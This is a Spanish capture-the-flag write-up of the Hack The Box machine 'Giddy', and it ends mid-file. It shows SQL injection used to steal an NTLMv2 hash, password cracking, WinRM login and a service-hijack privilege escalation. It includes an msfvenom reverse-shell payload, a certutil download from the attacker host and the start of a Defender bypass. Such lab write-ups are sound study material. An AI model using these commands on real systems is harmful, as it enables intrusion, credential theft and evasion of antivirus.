<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">IIS</span> <span class="no">Windows</span> <span class="no">Server</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/1.png" />
</p>

<ul>
  <li>Si damos <code class="language-plaintext highlighter-rouge">click</code> en la imagen nos lleva aquí.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/2.png" />
</p>

<ul>
  <li>La razón es por que en el código fuente hay una etiqueta la cual al dar <code class="language-plaintext highlighter-rouge">click</code> en la imagen nos redirige a esa ruta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/3.png" />
</p>

<ul>
  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si encontramos rutas interesantes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.129.96.140 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.129.96.140
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 80
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/remote               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 157] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /Remote/default.aspx?ReturnUrl<span class="o">=</span>%2fremote]
/<span class="k">*</span>checkout<span class="k">*</span>           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>docroot<span class="k">*</span>            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/mvc                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 148] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.96.140/mvc/]
/http%3A%2F%2Fwww     <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/q%26a                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3a            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>http%3A             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3A            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fyoutube <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblogs   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblog    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Remote               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 157] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /Remote/default.aspx?ReturnUrl<span class="o">=</span>%2fRemote]
/<span class="k">**</span>http%3A%2F%2Fwww   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/s%26p                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/%3FRID%3D2671        <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/devinmoore<span class="k">*</span>          <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/200109<span class="k">*</span>              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>sa_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>dc_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fcommunity <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fradar   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/q%26a2               <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/login%3f             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Shakira%20Oral%20Fixation%201%20%26%202 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fjeremiahgrossman <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fweblog  <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fswik    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
Progress: 220546 / 220547 <span class="o">(</span>100.00%<span class="o">)</span>
<span class="o">===============================================================</span>
Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<ul>
  <li>Bueno si nos vamos a la parte de <code class="language-plaintext highlighter-rouge">Remote</code> encontramos esto pero no tenemos credenciales.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/4.png" />
</p>

<ul>
  <li>Si vamos ala ruta <code class="language-plaintext highlighter-rouge">mvc</code> nada interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/5.png" />
</p>

<h2 id="sql-injection">SQL Injection</h2>

<ul>
  <li>Si selecciono un producto la <strong>URL</strong> ya es interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/6.png" />
</p>

<ul>
  <li>Si pongo una <code class="language-plaintext highlighter-rouge">'</code> después de <code class="language-plaintext highlighter-rouge">id=28</code>  nos devuelve un error además de que vemos un usuario <code class="language-plaintext highlighter-rouge">jnogueira</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/7.png" />
</p>

<ul>
  <li>
    <p>Estamos ante una maquina Windows a si que lo que podemos hacer es jugar con el <code class="language-plaintext highlighter-rouge">xp_dirtree</code> sabiendo que corre <code class="language-plaintext highlighter-rouge">mysql</code> por detrás <a href="https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server">https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server</a>.</p>
  </li>
  <li>
    <p>Si vemos el recurso vemos que comparten una <code class="language-plaintext highlighter-rouge">query</code> que al parecer se esta usando para robar el hash NTLMv2 de algún usuario ya que se conecta algún recurso compartido podemos nosotros compartir uno para intentarlo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Pero nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/8.png" />
</p>

<ul>
  <li>Si revisamos el error nos dice <code class="language-plaintext highlighter-rouge">Incorrect syntar near '</code> así que vamos a probar quitándole la <code class="language-plaintext highlighter-rouge">'</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/9.png" />
</p>

<ul>
  <li>Y funciona nos llega el hash del usuario <code class="language-plaintext highlighter-rouge">Stacy</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.96.140,49709<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>GIDDY<span class="se">\S</span>tacy,GIDDY<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\S</span>tacy authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stacy::GIDDY:aaaaaaaaaaaaaaaa:fd090e689929af2ccc006414acc9091c:01010000000000000050ab281298da0166fd32f6cb3311030000000001001000650050005200740050004500440068000300100065005000520074005000450044006800020010006f006a0065006f004700740061004100040010006f006a0065006f004700740061004100070008000050ab281298da0106000400020000000800300030000000000000000000000000300000670f571a29eefa618339fbbf9271e7c33d87cc2100fa14d9046c67efb0dcd8ce0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320031003600000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>GIDDY<span class="se">\S</span>tacy,GIDDY<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\S</span>tacy authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stacy::GIDDY:aaaaaaaaaaaaaaaa:2d920fc42f14ee67db3416f7bfb13486:010100000000000080e643291298da01927a3a66ded6d3fe0000000001001000650050005200740050004500440068000300100065005000520074005000450044006800020010006f006a0065006f004700740061004100040010006f006a0065006f0047007400610041000700080080e643291298da0106000400020000000800300030000000000000000000000000300000670f571a29eefa618339fbbf9271e7c33d87cc2100fa14d9046c67efb0dcd8ce0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320031003600000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.96.140,49709<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</code></pre></div></div>

<h2 id="stacy">Stacy</h2>

<ul>
  <li>Vamos a crackear el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
xNnWo6272k7x     <span class="o">(</span>Stacy<span class="o">)</span>
1g 0:00:00:16 DONE <span class="o">(</span>2024-04-26 13:47<span class="o">)</span> 0.05899g/s 158644p/s 158644c/s 158644C/s xabat..x9831915x
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>El usuario <code class="language-plaintext highlighter-rouge">Stacy</code> forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme winrm 10.129.96.140 <span class="nt">-u</span> <span class="s1">'stacy'</span> <span class="nt">-p</span> <span class="s1">'xNnWo6272k7x'</span>
SMB         10.129.96.140   5985   NONE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> None <span class="o">(</span>name:10.129.96.140<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
HTTP        10.129.96.140   5985   NONE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.96.140:5985/wsman
WINRM       10.129.96.140   5985   NONE             <span class="o">[</span>+] None<span class="se">\s</span>tacy:xNnWo6272k7x <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.96.140 <span class="nt">-u</span> <span class="s1">'stacy'</span> <span class="nt">-p</span> <span class="s1">'xNnWo6272k7x'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>giddy<span class="se">\s</span>tacy
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Vemos la primera flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
e7d6583b3852e4219ee8c8e1b83aa588
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Si recordamos tenemos Un <code class="language-plaintext highlighter-rouge">Windows PowerShell Web Access</code> así que podemos conectarnos por allí también.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/12.png" />
</p>

<ul>
  <li>Pero básicamente es lo mismo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/13.png" />
</p>

<ul>
  <li>Encontramos un archivo interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        6/17/2018   9:36 AM              6 unifivideo
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/14.png" />
</p>

<ul>
  <li>Tiene vulnerabilidades.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content searchsploit unifi video
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                        |  Path
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
Ubiquiti Networks UniFi Video Default | php/webapps/39268.java
Ubiquiti UniFi Video 3.7.3 - Local Pr | windows/local/43390.txt
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div>

<ul>
  <li>Si examinamos el <code class="language-plaintext highlighter-rouge">windows/local/43490.txt</code> nos dice donde esta instalado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5. VULNERABILITY DETAILS
<span class="o">========================</span>
Ubiquiti UniFi Video <span class="k">for </span>Windows is installed to <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-v
ideo</span><span class="se">\"</span><span class="s2">
by default and is also shipped with a service called "</span>Ubiquiti UniFi Vid
eo<span class="s2">". Its
executable "</span>avService.exe<span class="s2">" is placed in the same directory and also runs
 under
the NT AUTHORITY/SYSTEM account.
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        4/26/2024   2:48 PM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
</code></pre></div></div>

<ul>
  <li>Además nos dicen que tenemos capacidad de escritura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>However the default permissions on the <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-video"</span> <span class="nb">fold
</span>er are
inherited from <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData"</span> and are not explicitly overridden, which
 allows
all <span class="nb">users</span>, even unprivileged ones, to append and write files to the appl
ication
directory:

c:<span class="se">\P</span>rogramData&gt;icacls unifi-video
unifi-video NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>WD,AD,WEA,WA<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Y si es correcto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">echo </span>prueba <span class="o">&gt;</span> prueba
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        4/26/2024   2:48 PM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
<span class="nt">-a----</span>        4/26/2024   4:11 PM             18 prueba
<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
</code></pre></div></div>

<ul>
  <li>Nos dicen que cuando arrancas el servicio arranque un <code class="language-plaintext highlighter-rouge">.exe</code> que no existe en el directorio por defecto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Upon start and stop of the service, it tries to load and execute the file at
<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-video</span><span class="se">\t</span><span class="s2">askkill.exe"</span><span class="nb">.</span> However this file does not exist <span class="k">in
</span>the application directory by default at all.
</code></pre></div></div>

<ul>
  <li>
    <p>Lo que debemos hacer es crear ese <code class="language-plaintext highlighter-rouge">.exe</code>.</p>
  </li>
  <li>
    <p>Para crear binarios podemos usar <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.216 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> taskkill.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: taskkill.exe
</code></pre></div></div>

<ul>
  <li>Ahora lo vamos a subir ala maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:8080/taskkill.exe taskkill.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  0000  ...
  1c00
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>Si nos ponemos en escucha y lo ejecutamos para ver si nos llega una <code class="language-plaintext highlighter-rouge">reverse shell</code> vemos el siguiente error.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
The term <span class="s1">'.\taskkill.exe'</span> is not recognized as the name of a cmdlet, <span class="k">function</span>, script file, or operable program. Check the spelling of the name, or <span class="k">if </span>a path was included, verify that the path is correct and try again.
At line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: <span class="o">(</span>.<span class="se">\t</span>askkill.exe:String<span class="o">)</span> <span class="o">[]</span>, CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
</code></pre></div></div>

<ul>
  <li>Si lo hacemos rápido vemos que el Windows Defender lo detecta como virus.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
Program <span class="s1">'taskkill.exe'</span> failed to run: Operation did not <span class="nb">complete </span>successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~.
At line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos hacer un Bypass.</p>
  </li>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">mingw-w64</code> <a href="https://learn.microsoft.com/es-es/vcpkg/users/platforms/mingw">https://learn.microsoft.com/es-es/vcpkg/users/platforms/mingw</a> para en vez de subir el <code class="language-plaintext highlighter-rouge">.exe</code> ala maquina vamos a crear un archivo <code class="language-plaintext highlighter-rouge">C</code> para compilar y así ya no lo detecte el defender.</p>
  </li>
  <li>
    <p>Lo que podemos decirle es que nos mande la <code class="language-plaintext highlighter-rouge">flag</code> de <code class="language-plaintext highlighter-rouge">root</code> a un recurso de nosotros.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>exc.c
<span class="c">#include &lt;stdlib.h&gt;</span>

int main<span class="o">(){</span>
